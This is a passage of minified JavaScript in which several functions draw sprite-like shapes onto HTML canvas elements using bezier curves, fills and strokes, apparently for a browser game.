      n.bezierCurveTo(e * 124.5, e * 466, e * 124.5, e * 466, e * 144, e * 469);
      n.bezierCurveTo(e * 145.5, e * 478.5, e * 145.5, e * 478.5, e * 147, e * 488);
      n.bezierCurveTo(e * 133.5, e * 495.5, e * 133.5, e * 495.5, e * 120, e * 503);
      n.bezierCurveTo(e * 108.5, e * 492, e * 108.5, e * 492, e * 97, e * 481);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -20, e * -20);
      n.save();
      n.translate(e * 132, e * 423);
      n.rotate(0.16);
      Be(n, e * -14, e * -61, e * 28, e * 122, e * 10);
      n.restore();
      ye(n, t[4], t[5], e * 12.5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 100, e * 344);
      n.bezierCurveTo(e * 123, e * 214, e * 123, e * 214, e * 146, e * 84);
      n.bezierCurveTo(e * 166.5, e * 65, e * 166.5, e * 65, e * 187, e * 46);
      n.bezierCurveTo(e * 201, e * 71, e * 201, e * 71, e * 215, e * 96);
      n.bezierCurveTo(e * 199.5, e * 226.5, e * 199.5, e * 226.5, e * 184, e * 357);
      n.bezierCurveTo(e * 162.5, e * 362.5, e * 162.5, e * 362.5, e * 141, e * 368);
      n.closePath();
      ye(n, t[1], t[2], e * 12.5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 75, e * 328);
      n.bezierCurveTo(e * 88, e * 336.5, e * 88, e * 336.5, e * 101, e * 345);
      n.bezierCurveTo(e * 123.5, e * 337.5, e * 123.5, e * 337.5, e * 146, e * 330);
      n.bezierCurveTo(e * 165, e * 343.5, e * 165, e * 343.5, e * 184, e * 357);
      n.bezierCurveTo(e * 198.5, e * 353, e * 198.5, e * 353, e * 213, e * 349);
      n.bezierCurveTo(e * 200.5, e * 364.5, e * 200.5, e * 364.5, e * 188, e * 380);
      n.bezierCurveTo(e * 163, e * 380.5, e * 163, e * 380.5, e * 138, e * 381);
      n.bezierCurveTo(e * 112, e * 373.5, e * 112, e * 373.5, e * 86, e * 366);
      n.closePath();
      ye(n, t[1], t[2], e * 12.5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 121, e * 332);
      n.bezierCurveTo(e * 133.5, e * 327.5, e * 133.5, e * 327.5, e * 146, e * 323);
      n.bezierCurveTo(e * 157, e * 330.5, e * 157, e * 330.5, e * 168, e * 338);
      n.bezierCurveTo(e * 182.5, e * 219.5, e * 182.5, e * 219.5, e * 197, e * 101);
      n.bezierCurveTo(e * 190, e * 84.5, e * 190, e * 84.5, e * 183, e * 68);
      n.bezierCurveTo(e * 172.5, e * 81, e * 172.5, e * 81, e * 162, e * 94);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105, e * 463);
      n.bezierCurveTo(e * 124.5, e * 466, e * 124.5, e * 466, e * 144, e * 469);
      n.bezierCurveTo(e * 145.5, e * 478.5, e * 145.5, e * 478.5, e * 147, e * 488);
      n.bezierCurveTo(e * 133.5, e * 495.5, e * 133.5, e * 495.5, e * 120, e * 503);
      n.bezierCurveTo(e * 108.5, e * 492, e * 108.5, e * 492, e * 97, e * 481);
      n.closePath();
      ye(n, t[1], t[2], e * 12.5);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 143, e * 346);
      n.bezierCurveTo(e * 125, e * 352, e * 125, e * 352, e * 107, e * 358);
      n.bezierCurveTo(e * 124, e * 363, e * 140, e * 368, e * 141, e * 368);
      n.bezierCurveTo(e * 156.5, e * 367, e * 156.5, e * 367, e * 172, e * 366);
      n.closePath();
      ye(n, t[3]);
      return r;
    }
    function xi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 154;
      r.height = e * 261;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 125, e * 69);
      n.bezierCurveTo(e * 123.5, e * 141.5, e * 123.5, e * 141.5, e * 122, e * 214);
      n.bezierCurveTo(e * 123, e * 228, e * 119, e * 239, e * 102, e * 239);
      n.bezierCurveTo(e * 90, e * 238, e * 86, e * 225, e * 89, e * 197);
      n.bezierCurveTo(e * 92, e * 159, e * 92, e * 141, e * 94, e * 84);
      n.bezierCurveTo(e * 94, e * 58, e * 87, e * 50, e * 73, e * 52);
      n.bezierCurveTo(e * 53, e * 54, e * 54, e * 92, e * 34, e * 87);
      n.bezierCurveTo(e * 13, e * 85, e * 22, e * 58, e * 34, e * 40);
      n.bezierCurveTo(e * 44, e * 24, e * 68, e * 17, e * 86, e * 21);
      n.bezierCurveTo(e * 111, e * 23, e * 123, e * 39, e * 125, e * 67);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 125, e * 69);
      n.bezierCurveTo(e * 123.5, e * 141.5, e * 123.5, e * 141.5, e * 122, e * 214);
      n.bezierCurveTo(e * 123, e * 228, e * 119, e * 239, e * 102, e * 239);
      n.bezierCurveTo(e * 90, e * 238, e * 86, e * 225, e * 89, e * 197);
      n.bezierCurveTo(e * 92, e * 159, e * 92, e * 141, e * 94, e * 84);
      n.bezierCurveTo(e * 94, e * 58, e * 87, e * 50, e * 73, e * 52);
      n.bezierCurveTo(e * 53, e * 54, e * 54, e * 92, e * 34, e * 87);
      n.bezierCurveTo(e * 13, e * 85, e * 22, e * 58, e * 34, e * 40);
      n.bezierCurveTo(e * 44, e * 24, e * 68, e * 17, e * 86, e * 21);
      n.bezierCurveTo(e * 111, e * 23, e * 123, e * 39, e * 125, e * 67);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 31, e * 43);
      n.bezierCurveTo(e * 31, e * 61, e * 43, e * 70, e * 51, e * 75);
      n.bezierCurveTo(e * 48, e * 84, e * 41, e * 89, e * 33, e * 86);
      n.bezierCurveTo(e * 23, e * 88, e * 20, e * 76, e * 23, e * 62);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 45, e * 29);
      n.bezierCurveTo(e * 49, e * 45, e * 61, e * 54, e * 64, e * 55);
      n.bezierCurveTo(e * 67.5, e * 53, e * 67.5, e * 53, e * 71, e * 51);
      n.bezierCurveTo(e * 80, e * 44, e * 83, e * 33, e * 82, e * 20);
      n.bezierCurveTo(e * 59, e * 17, e * 51, e * 23, e * 45, e * 30);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 86, e * 56);
      n.bezierCurveTo(e * 90, e * 33, e * 103, e * 25, e * 105, e * 27);
      n.bezierCurveTo(e * 116, e * 31, e * 121, e * 45, e * 122, e * 50);
      n.bezierCurveTo(e * 112, e * 62, e * 103, e * 63, e * 91, e * 62);
      n.bezierCurveTo(e * 89, e * 59.5, e * 89, e * 59.5, e * 87, e * 57);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 93, e * 81);
      n.bezierCurveTo(e * 109, e * 82, e * 123, e * 70, e * 124, e * 63);
      n.bezierCurveTo(e * 124, e * 75.5, e * 124, e * 75.5, e * 124, e * 88);
      n.bezierCurveTo(e * 119, e * 99, e * 103, e * 103, e * 94, e * 103);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 93, e * 124);
      n.bezierCurveTo(e * 108, e * 125, e * 122, e * 113, e * 124, e * 106);
      n.bezierCurveTo(e * 124, e * 119, e * 124, e * 129, e * 124, e * 132);
      n.bezierCurveTo(e * 110, e * 147, e * 94, e * 148, e * 90, e * 147);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 90, e * 170);
      n.bezierCurveTo(e * 104, e * 166, e * 122, e * 158, e * 122, e * 151);
      n.bezierCurveTo(e * 122, e * 162.5, e * 122, e * 162.5, e * 122, e * 174);
      n.bezierCurveTo(e * 111, e * 191, e * 97, e * 191, e * 89, e * 191);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 88, e * 208);
      n.bezierCurveTo(e * 100, e * 209, e * 115, e * 205, e * 122, e * 193);
      n.bezierCurveTo(e * 122, e * 205.5, e * 122, e * 205.5, e * 122, e * 218);
      n.bezierCurveTo(e * 115, e * 229, e * 103, e * 235, e * 90, e * 228);
      n.bezierCurveTo(e * 88, e * 224, e * 88, e * 217, e * 88, e * 211);
      n.closePath();
      ye(n, t[3]);
      n.globalAlpha = 0.4;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 22, e * 81);
      n.bezierCurveTo(e * 32, e * 84, e * 41, e * 81, e * 45, e * 68);
      n.bezierCurveTo(e * 50, e * 50, e * 62, e * 40, e * 79, e * 43);
      n.bezierCurveTo(e * 95, e * 45, e * 102, e * 58, e * 101, e * 81);
      n.bezierCurveTo(e * 99.5, e * 120.5, e * 99.5, e * 120.5, e * 98, e * 160);
      n.bezierCurveTo(e * 96.5, e * 191.5, e * 96.5, e * 191.5, e * 95, e * 223);
      n.bezierCurveTo(e * 93, e * 232, e * 101, e * 235, e * 108, e * 238);
      n.bezierCurveTo(e * 100, e * 240, e * 90, e * 233, e * 90, e * 224);
      n.bezierCurveTo(e * 92, e * 157, e * 92, e * 157, e * 94, e * 90);
      n.bezierCurveTo(e * 94, e * 56, e * 89, e * 53, e * 77, e * 51);
      n.bezierCurveTo(e * 58, e * 50, e * 54, e * 59, e * 49, e * 75);
      n.bezierCurveTo(e * 44, e * 91, e * 28, e * 90, e * 23, e * 81);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 82, e * 123);
      n.bezierCurveTo(e * 88, e * 130, e * 88, e * 127, e * 94, e * 128);
      n.bezierCurveTo(e * 91, e * 136, e * 94, e * 137, e * 99, e * 142);
      n.bezierCurveTo(e * 97, e * 149, e * 99, e * 152, e * 105, e * 155);
      n.bezierCurveTo(e * 107, e * 159, e * 113, e * 159, e * 120, e * 158);
      n.bezierCurveTo(e * 121, e * 160, e * 125, e * 163, e * 132, e * 163);
      n.bezierCurveTo(e * 133, e * 166, e * 136, e * 169, e * 138, e * 170);
      n.bezierCurveTo(e * 133, e * 171, e * 132, e * 172, e * 129, e * 174);
      n.bezierCurveTo(e * 122, e * 170, e * 120, e * 170, e * 116, e * 174);
      n.bezierCurveTo(e * 108, e * 170.5, e * 108, e * 170.5, e * 100, e * 167);
      n.bezierCurveTo(e * 95, e * 172, e * 94, e * 179, e * 95, e * 184);
      n.bezierCurveTo(e * 87, e * 185, e * 87, e * 189, e * 88, e * 194);
      n.bezierCurveTo(e * 82, e * 194, e * 81, e * 195, e * 79, e * 197);
      n.bezierCurveTo(e * 78, e * 192, e * 78, e * 191, e * 77, e * 189);
      n.bezierCurveTo(e * 81, e * 185, e * 82, e * 183, e * 80, e * 176);
      n.bezierCurveTo(e * 89, e * 170, e * 92, e * 168, e * 95, e * 163);
      n.bezierCurveTo(e * 91, e * 151, e * 88, e * 151, e * 82, e * 147);
      n.bezierCurveTo(e * 85, e * 142, e * 85, e * 137, e * 81, e * 133);
      n.bezierCurveTo(e * 84, e * 127, e * 84, e * 125, e * 82, e * 124);
      n.closePath();
      ye(n, t[4], t[5], e * 4);
      ze(n, e * 107, e * 152, e * 9);
      ye(n, t[6]);
      ze(n, e * 105, e * 173, e * 9);
      ye(n, t[6]);
      ze(n, e * 87, e * 161, e * 9);
      ye(n, t[6]);
      ze(n, e * 106, e * 147, e * 4);
      ye(n, t[7]);
      ze(n, e * 104, e * 167, e * 4);
      ye(n, t[7]);
      ze(n, e * 86, e * 154, e * 4);
      ye(n, t[7]);
      return r;
    }
    function Ji(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 350;
      r.height = e * 140;
      n.translate(e * -50, e * -150);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 184.5, e * 222.0625);
      n.bezierCurveTo(e * 185.5, e * 184.0625, e * 302.5, e * 171.0625, e * 313.5, e * 222.0625);
      n.bezierCurveTo(e * 330.5, e * 263.0625, e * 181.5, e * 274.0625, e * 184.5, e * 223.0625);
      n.closePath();
      ye(n, t[0], t[1], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 131.5, e * 241.0625);
      n.bezierCurveTo(e * 144.5, e * 278.0625, e * 270.5, e * 209.0625, e * 228.5, e * 174.0625);
      n.bezierCurveTo(e * 196.5, e * 147.0625, e * 117.5, e * 196.0625, e * 131.5, e * 240.0625);
      n.closePath();
      ye(n, t[0], t[1], e * 8);
      ze(n, e * 270.5, e * 225.0625, e * 15.811388300841896);
      ye(n, t[2]);
      ze(n, e * 243.5, e * 225.0625, e * 6.082762530298219);
      ye(n, t[2]);
      ze(n, e * 255.5, e * 210.0625, e * 10.816653826391969);
      ye(n, t[2]);
      ze(n, e * 167.5, e * 215.0625, e * 15.297058540778355);
      ye(n, t[2]);
      ze(n, e * 176.5, e * 204.0625, e * 7.280109889280518);
      ye(n, t[2]);
      ze(n, e * 206.5, e * 189.0625, e * 7.280109889280518);
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 151.5, e * 212.0625);
      n.bezierCurveTo(e * 161.5, e * 204.0625, e * 173.5, e * 214.0625, e * 158.5, e * 221.0625);
      n.bezierCurveTo(e * 145.5, e * 228.0625, e * 144.5, e * 216.0625, e * 151.5, e * 212.0625);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 194.5, e * 209.0625);
      n.bezierCurveTo(e * 205.5, e * 202.0625, e * 215.5, e * 207.0625, e * 199.5, e * 217.0625);
      n.bezierCurveTo(e * 187.5, e * 224.0625, e * 182.5, e * 217.0625, e * 194.5, e * 209.0625);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 188.5, e * 183.0625);
      n.bezierCurveTo(e * 201.5, e * 176.0625, e * 213.5, e * 187.0625, e * 193.5, e * 193.0625);
      n.bezierCurveTo(e * 185.5, e * 194.0625, e * 175.5, e * 189.0625, e * 188.5, e * 183.0625);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 261.5, e * 202.0625);
      n.bezierCurveTo(e * 274.5, e * 201.0625, e * 282.5, e * 214.0625, e * 261.5, e * 215.0625);
      n.bezierCurveTo(e * 246.5, e * 214.0625, e * 248.5, e * 203.0625, e * 261.5, e * 202.0625);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 240.5, e * 231.0625);
      n.bezierCurveTo(e * 255.5, e * 231.0625, e * 254.5, e * 243.0625, e * 240.5, e * 242.0625);
      n.bezierCurveTo(e * 225.5, e * 239.0625, e * 225.5, e * 232.0625, e * 240.5, e * 231.0625);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      return r;
    }
    function Xi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 217;
      r.height = e * 215;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 79, e * 113);
      n.bezierCurveTo(e * 135, e * 98, e * 136, e * 96, e * 142, e * 97);
      n.bezierCurveTo(e * 167, e * 106, e * 167, e * 106, e * 171, e * 109);
      n.bezierCurveTo(e * 173, e * 120, e * 173, e * 134, e * 169, e * 141);
      n.bezierCurveTo(e * 140, e * 149.5, e * 140, e * 149.5, e * 111, e * 158);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 154, e * 103);
      n.bezierCurveTo(e * 167, e * 91, e * 175, e * 87, e * 176, e * 94);
      n.bezierCurveTo(e * 175, e * 102, e * 176, e * 102, e * 186, e * 103);
      n.bezierCurveTo(e * 191, e * 104, e * 192, e * 105, e * 185, e * 116);
      n.bezierCurveTo(e * 183, e * 120, e * 191, e * 124, e * 189, e * 129);
      n.bezierCurveTo(e * 185, e * 139, e * 178, e * 134, e * 166, e * 131);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 60, e * 46);
      n.bezierCurveTo(e * 60, e * 34, e * 60, e * 29, e * 56, e * 19);
      n.bezierCurveTo(e * 52, e * 12, e * 52, e * 16, e * 49, e * 24);
      n.bezierCurveTo(e * 48, e * 27, e * 46, e * 28, e * 39, e * 27);
      n.bezierCurveTo(e * 33, e * 26, e * 34, e * 31, e * 35, e * 37);
      n.bezierCurveTo(e * 36, e * 41, e * 27, e * 46, e * 29, e * 52);
      n.bezierCurveTo(e * 36, e * 55, e * 35, e * 56, e * 31, e * 59);
      n.bezierCurveTo(e * 27, e * 65, e * 32, e * 64, e * 35, e * 62);
      n.closePath();
      ye(n, t[4], t[5], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 46, e * 50);
      n.bezierCurveTo(e * 51, e * 35, e * 70, e * 32, e * 78, e * 29);
      n.bezierCurveTo(e * 84, e * 27, e * 113, e * 36, e * 127, e * 41);
      n.bezierCurveTo(e * 140, e * 47, e * 147, e * 69, e * 137, e * 73);
      n.bezierCurveTo(e * 124, e * 92, e * 117, e * 92, e * 109, e * 94);
      n.bezierCurveTo(e * 101, e * 96, e * 89, e * 92, e * 65, e * 83);
      n.bezierCurveTo(e * 54, e * 80, e * 46, e * 58, e * 46, e * 51);
      n.closePath();
      ye(n, t[4], t[5], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 51, e * 40);
      n.bezierCurveTo(e * 49, e * 34, e * 49, e * 34, e * 47, e * 28);
      n.bezierCurveTo(e * 38, e * 28, e * 34, e * 27, e * 37, e * 37);
      n.bezierCurveTo(e * 43, e * 40.5, e * 43, e * 40.5, e * 49, e * 44);
      n.closePath();
      ye(n, t[7]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 29, e * 48);
      n.bezierCurveTo(e * 38, e * 49, e * 38, e * 49, e * 47, e * 50);
      n.bezierCurveTo(e * 46.5, e * 51.5, e * 46.5, e * 51.5, e * 46, e * 53);
      n.bezierCurveTo(e * 40, e * 53.5, e * 40, e * 53.5, e * 34, e * 54);
      n.bezierCurveTo(e * 29, e * 51, e * 32, e * 51.5, e * 30, e * 49);
      n.closePath();
      ye(n, t[7]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 89, e * 61);
      n.bezierCurveTo(e * 101, e * 70, e * 109, e * 90, e * 102, e * 90);
      n.bezierCurveTo(e * 97, e * 91, e * 87, e * 91, e * 60, e * 80);
      n.bezierCurveTo(e * 48, e * 65, e * 46, e * 56, e * 48, e * 53);
      n.bezierCurveTo(e * 50, e * 52, e * 66, e * 56, e * 89, e * 61);
      n.closePath();
      ye(n, t[7]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 99, e * 59);
      n.bezierCurveTo(e * 115, e * 45, e * 125, e * 42, e * 129, e * 47);
      n.bezierCurveTo(e * 138, e * 56, e * 140, e * 63, e * 138, e * 67);
      n.bezierCurveTo(e * 131, e * 80, e * 122, e * 87, e * 114, e * 90);
      n.bezierCurveTo(e * 105, e * 80, e * 95, e * 62, e * 98, e * 61);
      n.closePath();
      ye(n, t[7]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 118, e * 62);
      n.bezierCurveTo(e * 139, e * 45, e * 153, e * 40, e * 150, e * 48);
      n.bezierCurveTo(e * 145, e * 57, e * 157, e * 63, e * 157, e * 70);
      n.bezierCurveTo(e * 157, e * 74, e * 142, e * 77, e * 142, e * 85);
      n.bezierCurveTo(e * 143, e * 91, e * 141, e * 92, e * 135, e * 90);
      n.bezierCurveTo(e * 132, e * 90, e * 132, e * 96, e * 124, e * 99);
      n.bezierCurveTo(e * 118, e * 93, e * 116, e * 77, e * 116, e * 64);
      n.closePath();
      ye(n, t[4], t[5], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 90, e * 130);
      n.bezierCurveTo(e * 157, e * 115, e * 165, e * 111, e * 167, e * 115);
      n.bezierCurveTo(e * 170, e * 117, e * 171, e * 135, e * 167, e * 141);
      n.bezierCurveTo(e * 135.5, e * 149.5, e * 135.5, e * 149.5, e * 104, e * 158);
      n.closePath();
      ye(n, t[8]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 53, e * 119);
      n.bezierCurveTo(e * 46, e * 120, e * 40, e * 118, e * 34, e * 116);
      n.bezierCurveTo(e * 28, e * 111, e * 41, e * 112, e * 39, e * 108);
      n.bezierCurveTo(e * 36, e * 100, e * 49, e * 102, e * 53, e * 95);
      n.bezierCurveTo(e * 57, e * 84, e * 58, e * 85, e * 63, e * 93);
      n.bezierCurveTo(e * 68, e * 96, e * 72, e * 94, e * 80, e * 88);
      n.bezierCurveTo(e * 80, e * 96, e * 78, e * 107, e * 66, e * 115);
      n.closePath();
      ye(n, t[9], t[10], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 118, e * 64);
      n.bezierCurveTo(e * 133.5, e * 57, e * 133.5, e * 57, e * 149, e * 50);
      n.bezierCurveTo(e * 145, e * 54, e * 154, e * 65, e * 157, e * 68);
      n.bezierCurveTo(e * 138.5, e * 66.5, e * 138.5, e * 66.5, e * 120, e * 65);
      n.closePath();
      ye(n, t[8]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 118, e * 65);
      n.bezierCurveTo(e * 129, e * 77, e * 129, e * 77, e * 140, e * 89);
      n.bezierCurveTo(e * 131, e * 89, e * 130, e * 92, e * 128, e * 96);
      n.bezierCurveTo(e * 123.5, e * 82, e * 123.5, e * 82, e * 119, e * 68);
      n.closePath();
      ye(n, t[8]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 51, e * 112);
      n.bezierCurveTo(e * 63, e * 108, e * 78, e * 111, e * 88, e * 112);
      n.bezierCurveTo(e * 98, e * 122, e * 117, e * 136, e * 125, e * 157);
      n.bezierCurveTo(e * 123, e * 180, e * 123, e * 185, e * 118, e * 186);
      n.bezierCurveTo(e * 101, e * 190, e * 89, e * 191, e * 79, e * 187);
      n.bezierCurveTo(e * 53, e * 165, e * 50, e * 153, e * 47, e * 144);
      n.bezierCurveTo(e * 46, e * 128, e * 46, e * 124, e * 50, e * 112);
      n.closePath();
      ye(n, t[9], t[10], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 50, e * 114);
      n.bezierCurveTo(e * 81, e * 149, e * 80, e * 147, e * 80, e * 149);
      n.bezierCurveTo(e * 82, e * 155, e * 80, e * 182, e * 74, e * 182);
      n.bezierCurveTo(e * 60, e * 172, e * 52, e * 157, e * 47, e * 144);
      n.closePath();
      ye(n, t[11], t[11], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 85, e * 152);
      n.bezierCurveTo(e * 99, e * 150, e * 109, e * 152, e * 119, e * 156);
      n.bezierCurveTo(e * 122, e * 163, e * 122, e * 174, e * 117, e * 182);
      n.closePath();
      n.bezierCurveTo(e * 93, e * 188, e * 82, e * 187, e * 83, e * 179);
      ye(n, t[11], t[11], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 104, e * 166);
      n.bezierCurveTo(e * 133, e * 165, e * 142, e * 168, e * 137, e * 173);
      n.bezierCurveTo(e * 127, e * 177, e * 137, e * 195, e * 126, e * 196);
      n.bezierCurveTo(e * 112, e * 195, e * 112, e * 194, e * 109, e * 199);
      n.bezierCurveTo(e * 105, e * 205, e * 102, e * 195, e * 96, e * 197);
      n.bezierCurveTo(e * 84, e * 201, e * 88, e * 198, e * 90, e * 187);
      n.bezierCurveTo(e * 96, e * 171, e * 97, e * 170, e * 103, e * 167);
      n.closePath();
      ye(n, t[9], t[10], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105, e * 168);
      n.bezierCurveTo(e * 118, e * 172.5, e * 118, e * 172.5, e * 131, e * 177);
      n.bezierCurveTo(e * 133, e * 190, e * 132, e * 199, e * 116, e * 194);
      n.bezierCurveTo(e * 110, e * 182, e * 110, e * 182, e * 104, e * 170);
      n.closePath();
      ye(n, t[10]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 102, e * 169);
      n.bezierCurveTo(e * 100.5, e * 182, e * 100.5, e * 182, e * 99, e * 195);
      n.bezierCurveTo(e * 93.5, e * 196.5, e * 93.5, e * 196.5, e * 88, e * 198);
      n.bezierCurveTo(e * 94, e * 176, e * 96, e * 174, e * 101, e * 168);
      n.closePath();
      ye(n, t[9], t[9], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 64, e * 107);
      n.bezierCurveTo(e * 64, e * 101, e * 64, e * 101, e * 64, e * 95);
      n.bezierCurveTo(e * 57, e * 86, e * 57, e * 84, e * 53, e * 97);
      n.bezierCurveTo(e * 55, e * 103.5, e * 55, e * 103.5, e * 57, e * 110);
      n.closePath();
      ye(n, t[11], t[11], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 40, e * 108);
      n.bezierCurveTo(e * 46.5, e * 111, e * 46.5, e * 111, e * 53, e * 114);
      n.bezierCurveTo(e * 50.5, e * 117, e * 50.5, e * 117, e * 48, e * 120);
      n.bezierCurveTo(e * 40.5, e * 117.5, e * 40.5, e * 117.5, e * 33, e * 115);
      n.bezierCurveTo(e * 36, e * 112, e * 36, e * 112, e * 39, e * 109);
      n.closePath();
      ye(n, t[11], t[11], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 189, e * 106);
      n.bezierCurveTo(e * 178.5, e * 110.5, e * 178.5, e * 110.5, e * 168, e * 115);
      n.bezierCurveTo(e * 168.5, e * 119, e * 168.5, e * 119, e * 169, e * 123);
      n.bezierCurveTo(e * 179, e * 124.5, e * 179, e * 124.5, e * 189, e * 126);
      n.bezierCurveTo(e * 182, e * 118, e * 183, e * 115, e * 188, e * 106);
      n.closePath();
      ye(n, t[8]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 69, e * 178);
      n.bezierCurveTo(e * 69, e * 141, e * 70, e * 136, e * 77, e * 137);
      n.bezierCurveTo(e * 88, e * 133, e * 101, e * 134, e * 108, e * 137);
      ye(n, undefined, t[3], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 161);
      n.bezierCurveTo(e * 54, e * 124, e * 55, e * 119, e * 62, e * 119);
      n.bezierCurveTo(e * 74, e * 117, e * 85, e * 117, e * 93, e * 119);
      ye(n, undefined, t[3], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 91, e * 29);
      n.bezierCurveTo(e * 74, e * 33, e * 62, e * 46, e * 57, e * 54);
      n.bezierCurveTo(e * 57, e * 63, e * 68, e * 76, e * 77, e * 87);
      ye(n, undefined, t[6], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 107, e * 33);
      n.bezierCurveTo(e * 82, e * 51, e * 80, e * 52, e * 79, e * 59);
      n.bezierCurveTo(e * 78, e * 65, e * 93, e * 86, e * 101, e * 93);
      ye(n, undefined, t[6], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 130, e * 98);
      n.bezierCurveTo(e * 126.5, e * 103, e * 126.5, e * 103, e * 123, e * 108);
      n.bezierCurveTo(e * 133.5, e * 107, e * 133.5, e * 107, e * 144, e * 106);
      n.bezierCurveTo(e * 138.5, e * 110, e * 138.5, e * 110, e * 133, e * 114);
      n.bezierCurveTo(e * 142, e * 114, e * 142, e * 114, e * 151, e * 114);
      n.bezierCurveTo(e * 146.5, e * 119.5, e * 146.5, e * 119.5, e * 142, e * 125);
      n.bezierCurveTo(e * 146.5, e * 127, e * 146.5, e * 127, e * 151, e * 129);
      n.bezierCurveTo(e * 147.5, e * 132, e * 147.5, e * 132, e * 144, e * 135);
      n.bezierCurveTo(e * 148, e * 137, e * 148, e * 137, e * 152, e * 139);
      n.bezierCurveTo(e * 149, e * 142.5, e * 149, e * 142.5, e * 146, e * 146);
      ye(n, undefined, t[3], e * 4);
      return r;
    }
    function qi(e, i, t) {
